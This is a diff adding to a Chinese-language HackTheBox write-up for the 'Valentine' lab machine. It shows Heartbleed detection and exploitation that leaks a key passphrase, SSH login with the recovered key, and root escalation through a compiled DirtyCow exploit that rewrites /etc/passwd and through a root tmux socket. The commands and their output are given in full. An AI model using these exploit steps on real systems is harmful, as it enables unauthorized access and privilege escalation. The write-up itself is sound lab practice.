@@ -127,7 +127,9 @@ RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
 
 看上去像是一个ssh的私钥，保存到本地文件```id_rsa```
 
-直接用这个私钥登录需要密码，而用john我貌似爆破不出来私钥的密码。
+我猜测```hype```应该是一个ssh用户名。
+
+但是直接用这个私钥登录需要密码，而用john我貌似爆破不出来私钥的密码。
 
 
 
@@ -174,11 +176,309 @@ decode页面是把输入信息从base64解密
 经验证， encode 和 decode页面都存在xss漏洞。但是换成php代码以后，php并没有被执行。
 结合notes.txt的内容，感觉这个事情没有那么简单，特别是```Make sure encoding/decoding is only done client-side.```这句，有可能我们的输入是会被服务端执行的，在这种时候就有可能回弹一个webshell
 
+然而研究了好久也毫无头绪。。。
+
+## 心脏滴血漏洞？
+
+web的首页有一张图片，不知道表达什么意思，于是我扔到谷歌图片搜索里。
+后来让我找到了[这篇关于心脏滴血漏洞的文章](https://www.cnblogs.com/wjw-zm/p/11651382.html)
+
+用nmap检查是否存在漏洞
+
+```
+┌──(root💀kali)-[~/htb/Valentine]
+└─# nmap -sV -p 443 --script ssl-heartbleed.nse 10.10.10.79
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-14 02:00 EST
+Nmap scan report for 10.10.10.79
+Host is up (0.26s latency).
+
+PORT    STATE SERVICE  VERSION
+443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+| ssl-heartbleed: 
+|   VULNERABLE:
+|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
+|     State: VULNERABLE
+|     Risk factor: High
+|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
+|           
+|     References:
+|       http://www.openssl.org/news/secadv_20140407.txt 
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
+|_      http://cvedetails.com/cve/2014-0160/
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.56 seconds
+
+```
+
+ok，证实存在漏洞。
+
+在kali上查找可以利用的exp
+```
+┌──(root💀kali)-[~/htb/Valentine]
+└─# searchsploit Heartbleed   
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)                                                                                                       | multiple/remote/32764.py
+OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                                                                                                                                       | multiple/remote/32791.c
+OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)                                                                                                                        | multiple/remote/32998.c
+OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                                                                                                                                          | multiple/remote/32745.py
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+```
+
+选择32764.py
+
+执行攻击
+```
+┌──(root💀kali)-[~/htb/Valentine]
+└─# python 32764.py 10.10.10.79 -p 443                                                                                                                                                                                                  1 ⨯
+Trying SSL 3.0...
+Connecting...
+Sending Client Hello...
+Waiting for Server Hello...
+ ... received message: type = 22, ver = 0300, length = 94
+ ... received message: type = 22, ver = 0300, length = 885
+ ... received message: type = 22, ver = 0300, length = 331
+ ... received message: type = 22, ver = 0300, length = 4
+Sending heartbeat request...
+ ... received message: type = 24, ver = 0300, length = 16384
+Received heartbeat response:
+  0000: 02 40 00 D8 03 00 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
+  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
+  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
+  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
+  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
+  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
+  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
+  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
+  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
+  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
+  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
+  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
+  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
+  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
+  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
+  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
+  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
+  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
+  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
+  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
+  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
+  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D BA  mV0aGVoeXBlCg==.
+  0160: 2C 28 70 21 7E 17 2B EC 7F CA 55 3C B7 FE 2F DD  ,(p!~.+...U<../.
+  0170: 1E BA 3F 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ..?.............
+  0180: 33 A4 44 73 F1 0F 07 E1 40 EB 91 80 94 08 36 6D  3.Ds....@.....6m
+  0190: 24 71 8B 74 B1 2A CE 3F 5A FE 19 00 17 00 41 04  $q.t.*.?Z.....A.
+  01a0: C7 0A 0A 7D 0F 97 67 BA A1 27 AD EA CD 6D 11 B4  ...}..g..'...m..
+  01b0: E9 4D 50 4A BB 4B 21 BE 5F ED A9 58 F1 30 5C 43  .MPJ.K!._..X.0\C
+  01c0: 45 64 D3 F3 84 96 B3 85 EC B9 58 C4 38 40 7C D2  Ed........X.8@|.
+  01d0: E5 26 4E FE D8 22 E3 BF 68 ED 9D 42 AF 92 2E 26  .&N.."..h..B...&
+  01e0: 00 2B 00 09 08 03 04 03 03 03 02 03 01 00 0D 00  .+..............
+  01f0: 18 00 16 04 03 05 03 06 03 08 04 08 05 08 06 04  ................
+  0200: 01 05 01 06 01 02 03 02 01 00 2D 00 02 01 01 00  ..........-.....
+  0210: 1C 00 02 40 01 00 00 00 00 00 00 00 00 00 00 00  ...@............
+  0220: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  0230: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  0240: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  0250: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  0260: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  0270: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  0280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  0290: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+  02a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+```
+
+留意泄露了一串base64加密的内容：```aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==```
+
+拿到web上解密，得到明文：
+```
+Your input:
+
+aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
+
+Your encoded input:
+
+heartbleedbelievethehype 
+```
+
+# 初始shell
+
+现在用```heartbleedbelievethehype```作为ssh秘钥登录靶机
+```
+┌──(root💀kali)-[~/htb/Valentine]
+└─# ssh -i id_rsa hype@10.10.10.79
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+New release '14.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
+hype@Valentine:~$ whoami
+hype
+hype@Valentine:~$ id
+uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
+
+``` 
+
+成功拿到初始shell
+
+# 提权
 
 
-id_rsa的可能要加解密，文件本身有问题
+## 提权方法一
+查看系统内核：
+```
+hype@Valentine:/tmp$ uname -a
+Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
+
+```
+
+linux版本比较旧，可以考虑内核提权
+
+使用github上[这个](https://github.com/mzet-/linux-exploit-suggester)内核枚举漏洞脚本
+
+```
+vailable information:
+
+Kernel version: 3.2.0
+Architecture: x86_64
+Distribution: ubuntu
+Distribution version: 12.04
+Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
+Package listing: from current OS
+
+Searching among:
+
+76 kernel space exploits
+48 user space exploits
+
+Possible Exploits:
+
+[+] [CVE-2016-5195] dirtycow
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Exposure: highly probable
+   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
+   Download URL: https://www.exploit-db.com/download/40611
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+[+] [CVE-2016-5195] dirtycow 2
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Exposure: highly probable
+   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
+   Download URL: https://www.exploit-db.com/download/40839
+   ext-url: https://www.exploit-db.com/download/40847
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+[+] [CVE-2013-2094] perf_swevent
+
+   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
+   Exposure: highly probable
+   Tags: RHEL=6,[ ubuntu=12.04{kernel:3.2.0-(23|29)-generic} ],fedora=16{kernel:3.1.0-7.fc16.x86_64},fedora=17{kernel:3.3.4-5.fc17.x86_64},debian=7{kernel:3.2.0-4-amd64}
+   Download URL: https://www.exploit-db.com/download/26131
+   Comments: No SMEP/SMAP bypass
+
+[+] [CVE-2013-2094] perf_swevent 2
+
+   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
+   Exposure: highly probable
+   Tags: [ ubuntu=12.04{kernel:3.(2|5).0-(23|29)-generic} ]
+   Download URL: https://cyseclabs.com/exploits/vnik_v1.c
+   Comments: No SMEP/SMAP bypass
+
+```
+
+可能存在脏牛漏洞，选择第二个脏牛利用exp，传到靶机
+
+编译，执行
+
+```
+hype@Valentine:/tmp$  gcc -pthread dirty.c -o dirty -lcrypt
+hype@Valentine:/tmp$ ls
+_cafenv-appconfig_  dirty  dirty.c  dirtyc0w  dirtyc0w.c  dirtyc0w.c.1  foo  linpeas.sh  linux-exploit-suggester.sh  o.txt  s.txt  tmux-1000  vmware-root
+hype@Valentine:/tmp$ chmod +x dirty
+hype@Valentine:/tmp$ ./dirty
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: 
+Complete line:
+firefart:fi8RL.Us0cfSs:0:0:pwned:/root:/bin/bash
+
+mmap: 7f4bbb4e4000
+madvise 0
+
+ptrace 0
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'firefart' and the password '123456'.
+
+
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'firefart' and the password '123456'.
+
+
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+hype@Valentine:/tmp$ su firefart
+Password: 
+firefart@Valentine:/tmp# id
+uid=0(firefart) gid=0(root) groups=0(root)
+
+```
+
+拿到root权限。
 
 
 
 
-openssl enc -base64 -in id_rsa -out id_rsa.base64
+## 提权方法二
+传linpea，发现下面命令可以直接提权：
+
+```/usr/bin/tmux -S /.devs/dev_sess```
+
+```
+root@Valentine:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Valentine:/tmp# whoami
+root
+
+```
+
+## other
+提权的时候我还看见靶机开启了一个内部的631的端口服务
+```
+hype@Valentine:/tmp$ netstat -ano|grep LISTEN
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
+tcp6       0      0 ::1:631                 :::*                    LISTEN      off (0.00/0/0)
+unix  2      [ ACC ]     STREAM     LISTENING     9269     /var/run/acpid.socket
+unix  2      [ ACC ]     STREAM     LISTENING     7446     @/com/ubuntu/upstart
+unix  2      [ ACC ]     STREAM     LISTENING     8182     @/org/bluez/audio
+unix  2      [ ACC ]     STREAM     LISTENING     67768    /tmp//tmux-1000/default
+unix  2      [ ACC ]     STREAM     LISTENING     9161     /.devs/dev_sess
+unix  2      [ ACC ]     STREAM     LISTENING     10180    /var/run/vmware/guestServicePipe
+unix  2      [ ACC ]     SEQPACKET  LISTENING     7624     /run/udev/control
+unix  2      [ ACC ]     STREAM     LISTENING     8144     /var/run/avahi-daemon/socket
+unix  2      [ ACC ]     STREAM     LISTENING     8152     /var/run/sdp
+unix  2      [ ACC ]     STREAM     LISTENING     8432     /var/run/cups/cups.sock
+unix  2      [ ACC ]     STREAM     LISTENING     7933     /var/run/dbus/system_bus_socket
+
+```
+
+用隧道连接到kali的时候发现是一个cups的服务，版本号是1.5.2
+找到了相应的攻击脚本，但是我没有办法提权。不知道这个是兔子洞还是我攻击方法有问题。。
+
+# 总结
+这台靶机的名字叫Valentine，但是关键步骤却是心脏滴血漏洞，就还挺黑色幽默的。。
+HTB的这些靶机的名字有时候会跟初始shell或者提权有关，有时候要好好琢磨一下。像buff那台用缓冲区溢出提权，shcker那台用的是shellshock拿到初始shell
+我花了很多时间在那个ssh私钥的加解密和base64页面拿webshell上，这个过程真的很折磨人，什么时候该放弃，也是个经验问题，小本本记起来。。
+
